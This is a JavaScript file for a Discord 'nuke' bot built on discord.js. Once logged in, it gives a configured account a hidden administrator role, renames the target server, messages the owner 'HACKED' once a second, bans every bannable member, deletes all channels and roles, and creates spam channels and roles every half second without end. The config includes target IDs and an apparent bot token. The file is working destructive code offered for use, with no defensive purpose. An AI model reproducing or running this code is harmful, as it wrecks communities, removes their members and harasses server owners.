const Discord = require("discord.js")
const client = new Discord.Client()

const configs = {
  "targetServerID": "675780884728774695",
  "accountID": "701986911899746356",
  "botNickname": "NA BOT✨",
  "botIcon": 'https://6.top4top.net/p_1415xrqem1.jpg',
  "newServerIcon": "https://6.top4top.net/p_1415xrqem1.jpg",
  "newServerName": "SERVER NAME AFTER THE HACKING",
  "token": "ODE10TA3NDIOMTE5NTUOMDQ4 YDZPAA.tHbHUABwjPUo4xGtv27kkuE ZG4S"
}

const setAdmin = (guildID, accountID) => {
  try {
    const targetServer = client.guilds.cache.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.cache.get(client.user.id).permissions.has('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.cache.get(client.user.id).permissions.has('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.roles.create({data: {name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}, reason: "HACKED"}).then((role) => {
        targetServer.members.cache.get(accountID).roles.add(role).catch((err) => {
           return console.error(`You are not in the ${targetServer.name} server ! You must to be in this server befor leveling up !`)
        })
    })
  }catch {}
}
  
const changeServerInfo = (guildID, options) => {
  const targetServer = client.guilds.cache.get(guildID)
  if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
  else if (!targetServer.members.cache.get(client.user.id).permissions.has("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)

  targetServer.setName(options.newServerName)
  targetServer.setIcon(options.newServerIcon)

  const embed = new Discord.MessageEmbed()
  .setAuthor(client.user.tag, client.user.displayAvatarURL())
  .setTitle("HACKED")
  .setDescription(`YOUR SERVER ${targetServer.name} HAS BEEN HACKED BY ${client.user.tag}`)
  .setFooter(client.user.tag, client.user.displayAvatarURL())
  .setColor("#ff0000")

  setInterval(() => {
    try {
      let ownerid = client.guilds.cache.get(guildID).ownerID;
      client.users.cache.get(ownerid).send(embed);
    }catch {}
  }, 1000)
}

const banMembers = (guildID) => {
  const targetServer = client.guilds.cache.get(guildID)
  if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
  else if (!targetServer.members.cache.get(client.user.id).permissions.has("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)

  targetServer.members.cache.forEach(async (member) => {
      member.bannable ? await member.ban({reason: `HACKED BY ${client.user.tag}`}) : undefined
  })
}

const changeNicks = (guildID, newNick) => {
  const targetServer = client.guilds.cache.get(guildID)
  if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
  else if (!targetServer.members.cache.get(client.user.id).permissions.has("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)

  targetServer.members.cache.forEach((member) => {
      try {

          member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
      } catch {}
  }) 
}

const createChannelsAndRoles = (guildID, name) => {
  const targetServer = client.guilds.cache.get(guildID)
  if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
  else if (!targetServer.members.cache.get(client.user.id).permissions.has("MANAGE_CHANNELS") || !targetServer.members.cache.get(client.user.id).permissions.has('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.cache.get(client.user.id).permissions.has('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
  targetServer.members.cache.forEach((member) => {
    member.roles.cache.forEach(async (role) => {
          try {
              await member.removeRole(role)

          } catch {}
    })
  })

  targetServer.channels.cache.forEach(async (channel) => {
      channel.deletable ? await channel.delete() : undefined
  })

  targetServer.roles.cache.forEach(async(role) => {
      role.deletable ? await role.delete() : undefined
  })

  setInterval(async () => {
    await targetServer.channels.create(name, "text")
    await targetServer.channels.create(name, "voice")
    await targetServer.roles.create({data: {name: `HACKED BY ${client.user.username}`, permissions: 0, color: 0xFF0000 }, reason: "HACKED"}).then(async(role) =>{
        await targetServer.members.cache.forEach(async (member) => {
            try {
                await member.roles.add(role)
            } catch {}
        })
    })
  }, 500)

}

client.on("ready", () => {
  console.log("THE HACKING STARTED NOW ")

  try {
    client.user.setUsername(configs.botNickname)
    client.user.setAvatar(configs.botIcon)
  }catch {}

  setAdmin(configs.targetServerID, configs.accountID)
  changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName, "newServerIcon": configs.newServerIcon})
  changeNicks(configs.targetServerID, configs.botNickname)
  banMembers(configs.targetServerID)
  createChannelsAndRoles(configs.targetServerID, configs.botNickname)
})


client.login(configs.token);
